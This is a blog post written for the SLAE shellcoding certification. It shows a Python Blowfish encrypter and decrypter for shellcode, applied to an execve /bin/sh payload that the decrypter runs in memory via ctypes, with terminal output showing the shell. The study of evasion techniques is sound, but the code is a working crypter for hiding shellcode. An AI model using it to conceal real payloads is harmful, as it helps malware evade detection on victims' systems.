---
title: Custom Encrypter  
author: fwinsnes
date: 2021-01-19 13:44:00 +0800
categories: [SLAE]
tags: [assembly, shellcoding]
---

#### Introduction

These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE certification. 

According to wikipedia, "In cryptography, encryption is the process of encoding information. This process converts the original representation of the information, known as plaintext, into an alternative form known as ciphertext. Ideally, only authorized parties can decipher a ciphertext back to plaintext and access the original information. Encryption does not itself prevent interference but denies the intelligible content to a would-be interceptor."

Today we are going to dive a little deep within Custom Encryption. 

The last assignment from the seven requires the creation of a Custom Encrypter, written in any language that can encrypt and decrypt shellcode. In addition, the decrypter should execute the shellcode.

#### Theory

During the length of this post, the crypter used will be [Blowfish](https://en.wikipedia.org/wiki/Blowfish_(cipher)). Moreover, the language employed will be Python, with the use of the library [pycrypto](https://pypi.org/project/pycrypto/)

##### Encrypter

```term
# Author: SLAE-27812 (Felipe Winsnes)

from Crypto.Cipher import Blowfish
import sys

if len(sys.argv) != 3:

   print "[*] Example: echo -ne <shellcode between quotes> | python encrypt.py <key> <IV number>" + "\r\n"
   sys.exit(1)

obj = Blowfish.new(sys.argv[1], Blowfish.MODE_CBC, sys.argv[2])

message = sys.stdin.read()

ciphertext = obj.encrypt(message)

crypted = ""

for x in bytearray(ciphertext):
  crypted += '\\x'
  ciphertext = '%02x' % x
  crypted += ciphertext

print '"' + crypted + '"'
```

As you can see, the shellcode must be printed and piped as an argument. Furthermore, the key and the IV must be parsed as arguments as well. In addition, the IV number should be 
specifically 8, as IV takes an 8 byte binary argument in such cryption schema.

Let's encode some execve shellcode that executes /bin/sh. The key will be '@-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ' and the IV 'ZYf3J4hM'. Furthermore, it is essential to note that the shellcode has to be divisible by 8. Due to this, the chosen shellcode has been parsed with a few nops. The original size was 22, it should be now 24.

```term
whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ python encrypt.py 
[*] Example: echo -ne <shellcode between quotes> | python encrypt.py <key> <IV number>

whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ 
whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80\x90\x90" | python encrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM 
"\x24\x5c\xc5\x8c\x39\x23\x01\x95\xfd\x4c\x76\x81\x92\xb4\x97\x18\x94\xb7\xf1\x4e\x7e\xb2\xd3\x42"
whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$
```

With no NOPS, the following error is given:

```term
whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80" | python encrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM 
Traceback (most recent call last):
  File "encrypt.py", line 15, in <module>
    ciphertext = obj.encrypt(message)
  File "/usr/lib/python2.7/dist-packages/Crypto/Cipher/blockalgo.py", line 244, in encrypt
    return self._cipher.encrypt(plaintext)
ValueError: Input strings must be a multiple of 8 in length
whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$
```

##### Decrypter

```term
# Author: SLAE-27812 (Felipe Winsnes)

from ctypes import *
from Crypto.Cipher import Blowfish
import sys

if len(sys.argv) != 3:

   print "[*] Example: python decrypt.py <key> <IV number>" + "\r\n"
   sys.exit(1)

decrypted = ""

ciphertext = ("\x24\x5c\xc5\x8c\x39\x23\x01\x95\xfd\x4c\x76\x81\x92\xb4\x97\x18\x94\xb7\xf1\x4e\x7e\xb2\xd3\x42")

obj = Blowfish.new(sys.argv[1], Blowfish.MODE_CBC, sys.argv[2])

decrypt = obj.decrypt(ciphertext)
shellcode = decrypt

print "Original shellcode in hex escape sequence:"

for x in bytearray(decrypt):

  decrypted += '\\x'
  decrypt = '%02x' % x
  decrypted += decrypt

print '"' + (decrypted) + '"'

buffer = create_string_buffer(shellcode)
print " "
boom = cast(buffer, CFUNCTYPE(c_void_p))

boom()
```

#### EndGame

```term
whitecr0wz@SLAE:~/assignments/Assignment_7$ python decrypt.py 
[*] Example: python decrypt.py <key> <IV number>

whitecr0wz@SLAE:~/assignments/Assignment_7$ python decrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM 
Original shellcode in hex escape sequence:
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80\x90\x90"
 
$
```

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/Assignment_7).
